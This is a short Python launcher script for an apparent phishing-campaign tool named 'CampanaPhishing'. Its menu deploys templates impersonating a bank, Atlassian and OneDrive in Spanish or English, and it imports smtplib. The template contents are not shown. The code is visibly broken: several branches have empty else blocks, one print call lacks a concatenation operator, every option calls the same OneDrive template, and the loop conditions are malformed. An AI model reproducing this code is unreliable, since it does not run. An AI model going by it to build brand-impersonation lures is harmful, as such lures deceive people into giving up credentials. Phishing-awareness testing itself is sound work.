import time
import os
import sys
import smtplib

#Import templates
from Templates.spanish.bankEs import BankEs
from Templates.spanish.onedriveEs import OneDriveEs

#Import helpers
from helper.helper import getPath,generateFolderReport

Version="0.1"

def main():
    print("Starting CampanaPhishing --> Version: v"+Version+"\n Templates to deploy:")
    print("\n[1] Bank ")
    print("\n[2] Atalasian")
    print("\n[3] OneDrive")
    print("\nSelect your option: \n")

    #Save path and create directory where the user save the reports

    value=int(input())
    languageString="Choose language: \n[0]Spanish \n[1]English"+getPath()
    generateFolderReport()
    
    #Bank Template
    if value == 1:
        print("\nBank:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                OneDriveEs()
            else:
                #Template English
                
    #Atalasian
    elif value ==2:
        print("\nAtalasian:\n"languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                OneDriveEs()
            else:
                #Template English
                
    #Onedrive Template
    elif value ==3:
        print("\nOneDrive:\n"+languageString)
        language=int(input())
        while language!=0|language!=1:
            if language==0:
                #Template Spanish
                OneDriveEs()
            else:
                #Template English
                
    else:
        print("\nInvalid option")
        sys.exit()

main()